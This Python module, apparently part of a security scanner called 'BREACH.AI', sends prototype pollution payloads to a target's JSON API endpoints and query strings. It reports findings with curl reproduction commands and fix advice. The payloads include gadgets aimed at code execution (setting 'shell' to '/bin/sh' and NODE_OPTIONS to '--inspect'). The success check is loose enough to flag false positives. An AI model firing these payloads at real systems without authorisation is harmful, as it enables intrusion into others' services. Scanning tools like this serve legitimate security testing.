"""
BREACH.AI - Prototype Pollution Exploiter
=========================================
Detects JavaScript prototype pollution vulnerabilities.
"""

import asyncio
import json
from typing import List
from .base import BaseAttack, Finding, Severity


class PrototypePollution(BaseAttack):
    """
    Prototype Pollution Exploiter

    Tests for:
    - Server-side prototype pollution (Node.js)
    - Client-side prototype pollution indicators
    - JSON merge pollution
    - Query parameter pollution
    """

    name = "Prototype Pollution"

    POLLUTION_PAYLOADS = [
        # Basic pollution
        {"__proto__": {"polluted": "yes"}},
        {"constructor": {"prototype": {"polluted": "yes"}}},
        {"__proto__.polluted": "yes"},

        # Nested pollution
        {"a": {"__proto__": {"polluted": "yes"}}},
        {"a": {"constructor": {"prototype": {"polluted": "yes"}}}},

        # Array pollution
        {"__proto__": {"length": "100", "polluted": "yes"}},

        # Common gadgets
        {"__proto__": {"shell": "/bin/sh", "NODE_OPTIONS": "--inspect"}},
        {"__proto__": {"env": {"EVIL": "true"}}},
    ]

    async def run(self) -> List[Finding]:
        findings = []

        # Find JSON endpoints
        json_endpoints = self._find_json_endpoints()

        for endpoint in json_endpoints:
            # Test prototype pollution
            pollution_findings = await self._test_pollution(endpoint)
            findings.extend(pollution_findings)

        # Test query parameter pollution
        query_findings = await self._test_query_pollution()
        findings.extend(query_findings)

        return findings

    def _find_json_endpoints(self) -> List[str]:
        """Find endpoints that accept JSON."""
        endpoints = []

        for ep in self.state.discovered_endpoints:
            if any(x in ep.lower() for x in ["/api/", "/v1/", "/v2/", "/graphql"]):
                endpoints.append(ep)

        # Add common API paths
        common_paths = [
            "/api/user",
            "/api/users",
            "/api/profile",
            "/api/settings",
            "/api/update",
            "/api/merge",
            "/api/config",
        ]

        for path in common_paths:
            endpoints.append(f"{self.target.rstrip('/')}{path}")

        return list(set(endpoints))[:20]

    async def _test_pollution(self, endpoint: str) -> List[Finding]:
        """Test endpoint for prototype pollution."""
        findings = []

        for payload in self.POLLUTION_PAYLOADS:
            try:
                # Test with POST
                response = await self.client.post(
                    endpoint,
                    json=payload,
                    headers={"Content-Type": "application/json"}
                )

                # Check for pollution indicators
                if self._check_pollution_success(response):
                    findings.append(Finding(
                        title="Server-Side Prototype Pollution",
                        severity=Severity.HIGH,
                        category="Prototype Pollution",
                        endpoint=endpoint,
                        method="POST",
                        description="The server is vulnerable to prototype pollution. "
                                   "Malicious __proto__ properties are merged into objects.",
                        evidence=f"Payload: {json.dumps(payload)}\nResponse indicates pollution success",
                        business_impact=100000,
                        impact_explanation="Prototype pollution can lead to denial of service, "
                                         "authentication bypass, or remote code execution.",
                        fix_suggestion="Use Object.create(null) for dictionaries, "
                                     "filter __proto__ and constructor from input, "
                                     "use Map instead of plain objects.",
                        curl_command=f"curl -X POST -H 'Content-Type: application/json' -d '{json.dumps(payload)}' '{endpoint}'"
                    ))
                    break

                # Test with PUT/PATCH
                for method in ["PUT", "PATCH"]:
                    response = await self.client.request(
                        method,
                        endpoint,
                        json=payload,
                        headers={"Content-Type": "application/json"}
                    )

                    if self._check_pollution_success(response):
                        findings.append(Finding(
                            title=f"Server-Side Prototype Pollution ({method})",
                            severity=Severity.HIGH,
                            category="Prototype Pollution",
                            endpoint=endpoint,
                            method=method,
                            description="Prototype pollution detected via object merge.",
                            evidence=f"Payload: {json.dumps(payload)}",
                            business_impact=100000,
                            impact_explanation="Can lead to RCE in Node.js applications.",
                            fix_suggestion="Sanitize __proto__ from all input.",
                            curl_command=f"curl -X {method} -H 'Content-Type: application/json' -d '{json.dumps(payload)}' '{endpoint}'"
                        ))
                        break

            except Exception:
                continue

        return findings

    def _check_pollution_success(self, response) -> bool:
        """Check if prototype pollution was successful."""
        try:
            data = response.json()

            # Check if pollution property appears in response
            if isinstance(data, dict):
                if data.get("polluted") == "yes":
                    return True

                # Check nested
                for key, value in data.items():
                    if isinstance(value, dict) and value.get("polluted") == "yes":
                        return True

            # Check for error messages indicating pollution
            error_indicators = [
                "cannot read property",
                "prototype",
                "__proto__",
                "has been polluted",
            ]

            text = response.text.lower()
            for indicator in error_indicators:
                if indicator in text:
                    return True

        except Exception:
            pass

        return False

    async def _test_query_pollution(self) -> List[Finding]:
        """Test query parameter prototype pollution."""
        findings = []

        query_payloads = [
            "__proto__[polluted]=yes",
            "__proto__.polluted=yes",
            "constructor[prototype][polluted]=yes",
            "a[__proto__][polluted]=yes",
        ]

        for payload in query_payloads:
            try:
                url = f"{self.target}?{payload}"
                response = await self.client.get(url)

                if self._check_pollution_success(response):
                    findings.append(Finding(
                        title="Query Parameter Prototype Pollution",
                        severity=Severity.HIGH,
                        category="Prototype Pollution",
                        endpoint=self.target,
                        method="GET",
                        description="Prototype pollution via query parameter parsing.",
                        evidence=f"Payload: {payload}",
                        business_impact=100000,
                        impact_explanation="Query parsing library is vulnerable.",
                        fix_suggestion="Update query parsing library (qs, express).",
                        curl_command=f"curl '{url}'"
                    ))
                    break

            except Exception:
                continue

        return findings
